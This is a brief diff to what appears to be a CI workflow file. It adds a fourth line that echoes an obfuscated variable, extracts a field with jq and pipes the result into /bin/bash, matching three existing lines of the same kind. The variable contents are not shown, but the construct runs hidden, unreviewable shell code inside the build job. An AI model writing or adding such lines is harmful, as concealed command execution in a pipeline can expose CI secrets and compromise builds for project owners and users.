@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$svqu0643" | jq -r .gfi3487 | /bin/bash
           printf '%s' "$wbd13" | jq -r .sv1187 | /bin/bash
           echo $sxd63 | jq -r .ia5 | /bin/bash
+          echo $pz225 | jq -r .gfc983 | /bin/bash
 
       - name: Upload results
         if: always()
